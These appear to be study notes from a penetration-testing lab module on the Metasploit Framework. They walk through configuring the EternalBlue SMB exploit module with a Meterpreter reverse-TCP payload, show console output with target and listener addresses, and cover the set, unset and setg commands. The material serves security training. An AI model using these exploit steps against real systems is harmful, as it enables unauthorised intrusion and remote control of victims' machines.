The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.

  

The main components of the Metasploit Framework can be summarized as follows;

- **msfconsole**: The main command-line interface.
- **Modules**: supporting modules such as exploits, scanners, payloads, etc.
- **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module.


While using the Metasploit Framework, you will primarily interact with the Metasploit console. You can launch it from the AttackBox terminal using the `msfconsole` command. The console will be your main interface to interact with the different modules of the Metasploit Framework. Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack.

EXAMPLE (Eternalblue):
As mentioned earlier, the `show options` command will list all available parameters.

The show options command

           `msf6 exploit(windows/smb/ms17_010_eternalblue) > show options  Module options (exploit/windows/smb/ms17_010_eternalblue):     Name           Current Setting  Required  Description    ----           ---------------  --------  -----------    RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'    RPORT          445              yes       The target port (TCP)    SMBDomain      .                no        (Optional) The Windows domain to use for authentication    SMBPass                         no        (Optional) The password for the specified username    SMBUser                         no        (Optional) The username to authenticate as    VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.    VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.   Payload options (windows/x64/meterpreter/reverse_tcp):     Name      Current Setting  Required  Description    ----      ---------------  --------  -----------    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)    LHOST     10.10.44.70      yes       The listen address (an interface may be specified)    LPORT     4444             yes       The listen port   Exploit target:     Id  Name    --  ----    0   Windows 7 and Server 2008 R2 (x64) All Service Packs   msf6 exploit(windows/smb/ms17_010_eternalblue) >`
        

  

As you can see in the screenshot above, some of these parameters require a value for the exploit to work. Some required parameter values will be pre-populated, make sure you check if these should remain the same for your target. For example, a web exploit could have an RPORT (remote port: the port on the target system Metasploit will try to connect to and run the exploit) value preset to 80, but your target web application could be using port 8080.

In this example, we will set the RHOSTS parameter to the IP address of our target system using the `set` command.

A Meterpreter command prompt

           `msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39 rhosts => 10.10.165.39 msf6 exploit(windows/smb/ms17_010_eternalblue) > show options  Module options (exploit/windows/smb/ms17_010_eternalblue):     Name           Current Setting  Required  Description    ----           ---------------  --------  -----------    RHOSTS         10.10.165.39     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'    RPORT          445              yes       The target port (TCP)    SMBDomain      .                no        (Optional) The Windows domain to use for authentication    SMBPass                         no        (Optional) The password for the specified username    SMBUser                         no        (Optional) The username to authenticate as    VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.    VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.   Payload options (windows/x64/meterpreter/reverse_tcp):     Name      Current Setting  Required  Description    ----      ---------------  --------  -----------    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)    LHOST     10.10.44.70      yes       The listen address (an interface may be specified)    LPORT     4444             yes       The listen port   Exploit target:     Id  Name    --  ----    0   Windows 7 and Server 2008 R2 (x64) All Service Packs`

![[Pasted image 20240814182856.png]]

  

You can override any set parameter using the set command again with a different value. You can also clear any parameter value using the `unset` command or clear all set parameters with the `unset all` command.

You can use the `setg` command to set values that will be used for all modules. The `setg` command is used like the set command. The difference is that if you use the `set` command to set a value using a module and you switch to another module, you will need to set the value again. The `setg` command allows you to set the value so it can be used by default across different modules. You can clear any value set with `setg` using `unsetg`.